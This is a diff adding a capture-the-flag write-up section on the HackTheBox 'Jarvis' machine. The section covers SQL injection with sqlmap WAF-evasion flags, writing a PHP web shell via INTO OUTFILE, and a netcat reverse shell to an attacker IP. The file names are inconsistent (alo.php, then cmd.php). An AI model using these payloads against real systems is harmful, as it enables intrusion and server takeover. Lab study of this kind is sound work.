@@ -280,3 +280,42 @@ If you just need to pass a cookie:
 ```console
 sqlmap -u "http://10.10.10.185/login.php" --cookie "PHPSESSID=foobar"
 ```
+### Bypassing the WAF
+There’s some kind of **WAF** on the site that triggers when it’s being scanned for SQL injections.
+There’s an HTTP header in the response that confirms this:
+```console
+Pragma: no-cache
+Vary: Accept-Encoding
+IronWAF: 2.0.3
+Connection: close
+```
+To bypass the **WAF**, I changed the **User-Agent header** to a **random header** and added a delay when scanning with SQLmap:
+```console
+sqlmap -u http://jarvis.htb/room.php?cod=1 -p cod --delay 2 --random-agent
+```
+### Getting a shell
+MySQL has a built-in command that can be used to create and write system files. This command has the following format:
+```console
+mysql> select "text" INTO OUTFILE "file.txt"
+```
+One big drawback of this command is that it can be appended to an existing query using the **UNION SQL** token.
+#### Manually
+```console
+http://10.10.10.143/room.php?cod=100 UNION SELECT 1,2,3,4,5,6,"<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/alo.php-- -
+```
+I then navigate to cmd.php and also create listener on local machine:
+```console
+nc -nlvp 8888
+http://10.10.10.143/cmd.php?cmd=nc+-c+/bin/bash+10.10.16.5+8888
+```
+*or use burp to encode payload to URL format*
+#### sqlmap
+```console
+sqlmap -u http://jarvis.htb/room.php?cod=1 -p cod --delay 2 --random-agent --os-pwn
+sqlmap -u http://jarvis.htb/room.php?cod=1 -p cod --delay 2 --random-agent --os-shell
+```
+#### phpMyAdmin
+From the SQL console we can write a web shell:
+```console
+SELECT "<?php system($_GET['c']); ?>" into outfile "/var/www/html/sh3ll.php"
+```
